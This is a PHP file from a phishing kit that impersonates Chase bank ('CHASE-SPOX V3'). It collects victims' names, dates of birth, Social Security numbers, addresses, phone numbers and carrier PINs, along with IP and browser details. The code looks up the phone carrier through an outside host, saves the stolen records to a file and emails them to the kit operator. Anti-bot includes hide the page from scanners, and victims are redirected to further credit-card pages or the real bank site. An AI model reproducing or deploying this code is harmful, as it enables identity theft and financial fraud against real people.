<?php
ob_start();
session_start();

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Chase -
 * version 3.0
 * icq & telegram = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Chase             $#
###############################################

**/

include'../Anti/IP-BlackList.php';  
include'../Anti/Bot-Crawler.php';
include'../Anti/Bot-Spox.php';
include'../Anti/blacklist.php';
include'../Anti/new.php';
include'../Anti/Dila_DZ.php';


if (!isset($_SESSION['login_SESSION'])) {
  header("Location: ../../index");
  exit();
}

if(isset($_POST['First_name'])&&isset($_POST['Last_Name'])&&isset($_POST['dob'])&&isset($_POST['token'])&&isset($_POST['spox'])){

	include '../../admin/YOUR-CONFIG.php';
	include '../Functions/Fuck-you.php';
	
	$phone_number2 = str_replace(' ', '', $_POST["phoneNumber"] );
	$phone_number3 = str_replace('(', '', $phone_number2 );
	$phone_number4 = str_replace(')', '', $phone_number3 );
	$carrier = file_get_contents('http://spox-coder.info/spox/carrier_lookup.php?number=+1'.$phone_number4.'');

	$hi="#---------------------------[ -CHASE-SPOX V3- PERSONAL DETAILS ]----------------------------#\r\n";
	$hi.="First name: {$_POST['First_name']}\r\n";
	$hi.="Last name: {$_POST['Last_Name']}\r\n";
	$hi.="Date of birth : {$_POST['dob']}\r\n";
	$hi.="SSN number : {$_POST['ssn']}\r\n";
	$hi.="State: {$_POST['idstate']}\r\n";
	$hi.="Street address : {$_POST['Streetadd']}\r\n";
	$hi.="Suite/apt/other : {$_POST['address22']}\r\n";
	$hi.="Zip Code : {$_POST['zipcode']}\r\n";
	$hi.="Phone number: {$_POST['phoneNumber']}\r\n";
	$hi.="Carrier name: {$carrier}\r\n";
	$hi.="Carrier Pin : {$_POST['carrierpin']}\r\n";


	$hi.="#---------------------------[ -CHASE-SPOX V3- IP INFO ]----------------------------#\r\n";
	$hi.="IP ADDRESS: {$_SESSION['ip']}\r\n";
	$hi.="IP COUNTRY: {$_SESSION['country']}\r\n";
	$hi.="IP CITY: {$_SESSION['city']}\r\n";
	$hi.="BROWSER: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	$hi.="USER AGENT: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$hi.="TIME: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$hi.="#---------------------------[ -CHASE-SPOX V3- PERSONAL DETAILS ]----------------------------#\r\n";

		$save=fopen("../Chase_Result/billing".$pin.".txt","a+");
		fwrite($save,$hi);
		fclose($save);

	$subject="#CHASE SPOX BILLING FROM {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
	$headers="From: CHASE SPOX V3  <chase_spoxv3@dila.dz>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";

		@mail($your_email2,$subject,$hi,$headers);
		include 'Antibot.php';
		$key = substr(sha1(mt_rand()),1,25);

	if ($show_credit_card=="yes") {
		exit(header("Location: ../../credit_verify?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
	if ($show_success_page=="yes") {
		exit(header("Location: ../../thanks?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."")); 
	}else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: https://bit.ly/2koaH3G")); // go to bank login page officiel..
	}

}else{
    header("HTTP/1.0 404 Not Found");
    exit();
}

?>